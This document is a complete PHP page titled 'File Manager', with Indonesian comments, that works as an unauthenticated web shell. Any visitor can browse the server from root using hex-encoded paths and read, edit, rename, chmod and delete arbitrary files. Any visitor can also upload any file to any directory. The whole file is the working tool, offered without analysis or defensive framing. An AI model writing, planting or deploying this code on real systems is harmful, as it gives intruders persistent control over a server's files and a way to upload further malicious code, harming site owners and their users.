<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<style>
    .table-dark {
    background-color: #343a40;
    color: white;
}
.table-dark th,
.table-dark td {
    border: 1px solid #666;
}
.table-dark th {
    background-color: #23272b;
}
.table-dark tbody tr:hover {
    background-color: #454d55;
}
</style>
<body class="bg-dark text-white">
    <div class="container mt-5">
    <a href="?" class="text-decoration-none text-white">
    <h1 class="mb-4 text-center">File Manager</h1></a>
        <?php
        function hex($n) {
            $y = '';
            for ($i = 0; $i < strlen($n); $i++) {
                $y .= dechex(ord($n[$i]));
            }
            return $y;
        }
        function unhex($y) {
            $n = '';
            for ($i = 0; $i < strlen($y) - 1; $i += 2) {
                $n .= chr(hexdec($y[$i] . $y[$i + 1]));
            }
            return $n;
        }

        // menampilin daftar file dan direktori
        function listDirectory($path) {
            $directories = [];
            $files = [];

            if (is_dir($path)) {
                $items = array_diff(scandir($path), ['.', '..']);
                foreach ($items as $item) {
                    $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($fullPath)) {
                        $directories[] = $item;
                    } else {
                        $files[] = $item;
                    }
                }
            } else {
                echo "Path tidak valid atau bukan direktori.";
                return false;
            }

            return ['directories' => $directories, 'files' => $files];
        }

        function formatSize($size)
        {
            if ($size >= 1073741824) {
                return number_format($size / 1073741824, 2) . ' GB';
            } elseif ($size >= 1048576) {
                return number_format($size / 1048576, 2) . ' MB';
            } elseif ($size >= 1024) {
                return number_format($size / 1024, 2) . ' KB';
            } else {
                return $size . ' bytes';
            }
        }
        $path = isset($_GET['path']) ? unhex($_GET['path']) : getcwd();
        if (!is_dir($path)) {
            die("Path tidak valid atau bukan direktori.");
        }
        $path = str_replace("\\", "/", $path);
        $directoriesAndFiles = listDirectory($path);
        $paths = explode("/", $path);
        echo "<nav aria-label='breadcrumb'>
                <ol class='breadcrumb bg-dark p-0'>
                    <li class='breadcrumb-item'>PATH: <a href='?path=" . hex('/') . "'>Root</a></li>";
        foreach ($paths as $index => $part) {
            if ($part) {
                echo "<li class='breadcrumb-item'><a href='?path=" . hex(implode("/", array_slice($paths, 0, $index + 1))) . "'>$part</a></li>";
            }
        }
        echo "</ol></nav>";

        echo "<div class='row'>";
        
       // Menampilkan header keterangan
echo "<div class='container mt-4'>";
echo "<div class='mt-4'>
                <form method='post' enctype='multipart/form-data' class='bg-dark p-3 rounded'>
                    <input type='file' name='fileToUpload' class='form-control mb-2'>
                    <button type='submit' name='upload' class='btn btn-success w-100'>Upload</button>
                </form>
              </div>";

        if (isset($_POST['upload'])) {
            if (isset($_FILES['fileToUpload'])) {
                $uploadFile = $path . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
                if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadFile)) {
                    echo "<script>alert('File berhasil di-upload.'); window.location='?path=" . hex($path) . "';</script>";
                } else {
                    echo "<script>alert('Gagal meng-upload file.');</script>";
                }
            }
        }

// Menampilkan header untuk file/folder
echo "<div class='mb-4'>
        <h4>List Direktori dan File</h4>
        <div class='table-responsive'>
            <table class='table table-bordered table-striped table-dark'>
                <thead>
                    <tr>
                        <th>File/Folder</th>
                        <th>File Size</th>
                        <th>Modify</th>
                        <th>Owner/Group</th>
                        <th>Permission</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>";

// Gabungkan direktori dan file dalam satu list
$allItems = array_merge($directoriesAndFiles['directories'], $directoriesAndFiles['files']);

foreach ($allItems as $item) {
    $itemPath = $path . DIRECTORY_SEPARATOR . $item;
    
    // Mengambil informasi file atau folder
    $itemSize = is_dir($itemPath) ? 0 : filesize($itemPath);
    $itemModifyTime = date('Y-m-d H:i:s', filemtime($itemPath));
    $itemOwner = fileowner($itemPath);
    $itemGroup = filegroup($itemPath);
    $itemPermissions = substr(sprintf('%o', fileperms($itemPath)), -4);

    // Menampilkan folder atau file
    $icon = is_dir($itemPath) 
    ? '<a href="?path=' . hex($itemPath) . '" class="text-decoration-none text-white"><i class="fas fa-folder"></i></a>' 
    : '<a href="?view=' . hex($itemPath) . '" class="text-decoration-none text-white"><i class="fas fa-file-alt"></i></a>';

$typeLabel = is_dir($itemPath) ? 'Direktori' : 'File';
$sizeLabel = is_dir($itemPath) ? '-' : formatSize($itemSize);

// Menampilkan nama file/folder dengan tautan
$nameLink = is_dir($itemPath) 
    ? '<a href="?path=' . hex($itemPath) . '" class="text-decoration-none text-white">' . $item . '</a>' 
    : '<a href="?view=' . hex($itemPath) . '" class="text-decoration-none text-white">' . $item . '</a>';

    
    echo "<tr>
            <td>$icon $nameLink</td>
            <td>$sizeLabel</td>
            <td>$itemModifyTime</td>
            <td>$itemOwner/$itemGroup</td>
            <td>$itemPermissions</td>
            <td>
                <div class='btn-group'>
                    <a href='?path=" . hex($itemPath) . "' class='btn btn-info btn-sm' title='Lihat'>
                        <i class='fas fa-eye'></i>
                    </a>
                    " . (is_dir($itemPath) ? '' : "<a href='?edit=" . hex($itemPath) . "' class='btn btn-warning btn-sm' title='Edit'>
                        <i class='fas fa-edit'></i>
                    </a>") . "
                    <a href='?rename=" . hex($itemPath) . "' class='btn btn-primary btn-sm' title='Rename'>
                        <i class='fas fa-pen'></i>
                    </a>
                    <a href='?chmod=" . hex($itemPath) . "' class='btn btn-secondary btn-sm' title='Chmod'>
                        <i class='fas fa-lock'></i>
                    </a>
                    <a href='?touch=" . hex($itemPath) . "' class='btn btn-light btn-sm' title='Touch'>
                        <i class='fas fa-clock'></i>
                    </a>
                    <a href='?delete=" . hex($itemPath) . "' class='btn btn-danger btn-sm' title='Hapus'>
                        <i class='fas fa-trash'></i>
                    </a>
                </div>
            </td>
          </tr>";
}

echo "</tbody></table></div></div></div>";
        

        // Menghandle view file
        if (isset($_GET['view'])) {
            $file = unhex($_GET['view']);
            if (is_file($file)) {
                $content = file_get_contents($file);
                echo "<div class='mt-4'>
                        <h3>Isi File: " . basename($file) . "</h3>
                        <pre class='bg-dark p-3'>" . htmlspecialchars($content) . "</pre>
                      </div>";
            }
        }

        // Menghandle edit file
        if (isset($_GET['edit'])) {
            $file = unhex($_GET['edit']);
            if (is_file($file)) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
                    file_put_contents($file, $_POST['content']);
                    echo "<script>alert('File berhasil disimpan.'); window.location='?path=" . hex($path) . "';</script>";
                }
                $content = file_get_contents($file);
                echo "<div class='mt-4'>
                        <h3>Edit File: " . basename($file) . "</h3>
                        <form method='post'>
                            <textarea name='content' class='form-control' rows='10'>" . htmlspecialchars($content) . "</textarea><br>
                            <button type='submit' class='btn btn-primary'>Simpan</button>
                            <a href='?path=" . hex($path) . "' class='btn btn-secondary'>Batal</a>
                        </form>
                      </div>";
            }
        }

        // Menghandle rename file
        if (isset($_GET['rename'])) {
            $file = unhex($_GET['rename']);
            if (is_file($file)) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['new_name'])) {
                    $newName = $_POST['new_name'];
                    $newPath = dirname($file) . DIRECTORY_SEPARATOR . $newName;
                    if (rename($file, $newPath)) {
                        echo "<script>alert('File berhasil di-rename.'); window.location='?path=" . hex($path) . "';</script>";
                    } else {
                        echo "<script>alert('Gagal rename file.');</script>";
                    }
                }
                $currentName = basename($file);
                echo "<div class='mt-4'>
                        <h3>Rename File: " . $currentName . "</h3>
                        <form method='post'>
                            <input type='text' name='new_name' class='form-control' value='" . $currentName . "'><br>
                            <button type='submit' class='btn btn-primary'>Ganti Nama</button>
                            <a href='?path=" . hex($path) . "' class='btn btn-secondary'>Batal</a>
                        </form>
                      </div>";
            }
        }

        // Menghandle chmod file
        if (isset($_GET['chmod'])) {
            $file = unhex($_GET['chmod']);
            if (is_file($file)) {
                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['permissions'])) {
                    $permissions = $_POST['permissions'];
                    chmod($file, octdec($permissions));
                    echo "<script>alert('Permissions berhasil diubah.'); window.location='?path=" . hex($path) . "';</script>";
                }
                $currentPermissions = substr(sprintf('%o', fileperms($file)), -4);
                echo "<div class='mt-4'>
                        <h3>Chmod File: " . basename($file) . "</h3>
                        <form method='post'>
                            <input type='text' name='permissions' class='form-control' value='" . $currentPermissions . "'><br>
                            <button type='submit' class='btn btn-primary'>Set Permissions</button>
                            <a href='?path=" . hex($path) . "' class='btn btn-secondary'>Batal</a>
                        </form>
                      </div>";
            }
        }

        // Menghandle touch file
        if (isset($_GET['touch'])) {
            $file = unhex($_GET['touch']);
            if (touch($file)) {
                echo "<script>alert('Waktu akses dan modifikasi file berhasil diperbarui.'); window.location='?path=" . hex($path) . "';</script>";
            } else {
                echo "<script>alert('Gagal mengubah waktu akses dan modifikasi file.');</script>";
            }
        }

        // Menghapus file
        if (isset($_GET['delete'])) {
            $file = unhex($_GET['delete']);
            if (is_file($file)) {
                unlink($file);
                echo "<script>alert('File berhasil dihapus.'); window.location='?path=" . hex($path) . "';</script>";
            } elseif (is_dir($file)) {
                rmdir($file);
                echo "<script>alert('Folder berhasil dihapus.'); window.location='?path=" . hex($path) . "';</script>";
            }
        }
        ?>
    </div>

    <!-- Script Bootstrap dan FontAwesome -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
